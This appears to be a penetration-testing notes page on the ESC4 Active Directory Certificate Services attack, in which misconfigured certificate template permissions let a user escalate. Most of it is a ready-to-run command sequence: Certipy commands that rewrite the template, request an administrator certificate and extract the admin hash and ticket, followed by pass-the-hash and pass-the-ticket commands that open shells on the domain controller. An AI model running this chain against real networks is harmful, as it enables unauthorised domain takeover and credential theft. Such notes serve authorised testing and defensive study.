# ESC4

ESC4 is possible when templates are misconfigured at the access control level. Should Access Control Entries (ACEs) allow unintended, or unprivileged Active Directory users to edit security settings in the template it can result in unintended users being granted one of the following template security permissions:

* Owner
* WriteOwnerPrincipals
* WriteDaclPrincipals
* WritePropertyPrincipals

These permissions permit any domain user to modify any property in the template, making the template vulnerable.

The ESC4 template has the following security issues, making it vulnerable:

* Enabled: **True**
* Requires Manager Approval: **FALSE**

<figure><img src="../../../../.gitbook/assets/image (179).png" alt=""><figcaption><p>Certipy output</p></figcaption></figure>

## Modifying the certificate template using authorized user

Use a authorized user to modifying the vulnerable template that allow us to request admin certification with Certypy tool

{% code title="certipy" overflow="wrap" %}
```bash
certipy-ad template -dc-ip <DC_IP> -u <USER> -p <PASS> -template <TEMPLATE_NAME> -target-ip <TARGET_IP> -save-old

# -save-old: Save the old configuration
```
{% endcode %}



### Requesting a domain admin certificate using modified ESC4 template

Request the administrator certificate with a AD user with privilege.

{% code title="" overflow="wrap" %}
```bash
certipy req -ca <CERTIFICATE_AUTHORITIES> -dc-ip <DC_IP> -u <USER> -p <PASSWORD> -template <TEMPLATE_NAME> -target-ip <TARGET_IP> -upn administrator@<DOMAIN>
```
{% endcode %}



### Use .pfx certificate file to get creds

Once we have obtained the .pfx certificate file, we can request the domain admin TGT ticket and the administrator hash to gain access to the domain controller&#x20;

```bash
certipy auth -pfx administrator.pfx
```



### Restoring the original Template after the attack using the old configuration

{% code title="" overflow="wrap" %}
```bash
certipy-ad template -dc-ip <DC_IP> -u <USER> -p <PASS> -template <TEMPLATE_NAME> -target-ip <TARGET_IP> -configuration <TEMPLATE_NAME>.json
```
{% endcode %}



## Gaining Access to DC

Once we obtain either the administrator hash or the TGT ticket, we can use different tools to log into the Domain Controller, such as:

* impacket-smbexec
* impacket-psexec
* evil-winrm
* NetExec

### Use Pass-The-Hash technique

{% code title="smbexec" %}
```bash
impacket-smbexec administrator@<DC_IP> -hashes <ADMINISTRATOR_HASH>
```
{% endcode %}

{% code title="psexec" %}
```bash
impacket-psexec administrator@<DC_IP> -hashes <LMHASH:NTHASH>
```
{% endcode %}

{% code title="evil-winrm" %}
```bash
evil-winrm -i <DC_IP> -u Administrator -H <ADMINISTRATOR_HASH>
```
{% endcode %}



### Use Pass-The-Ticket technique

{% code title="psexec" %}
```bash
export KRB5CCNAME=administrator.ccache

impacket-psexec administrator@<DC_IP> -k -no-pass
```
{% endcode %}

{% code title="PKINIT & psexec" overflow="wrap" %}
```bash
python getttgtpkinit.py <DOMAIN>/administrator -cert-pfx /PATH/TO/administrator.pfx PKINIT-Administrator.ccache

export KRB5CCNAME=PKINIT-Administrator.ccache

impacket-psexec administrator@<DC_IP> -k -no-pass
```
{% endcode %}





## Resources

{% embed url="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/" %}
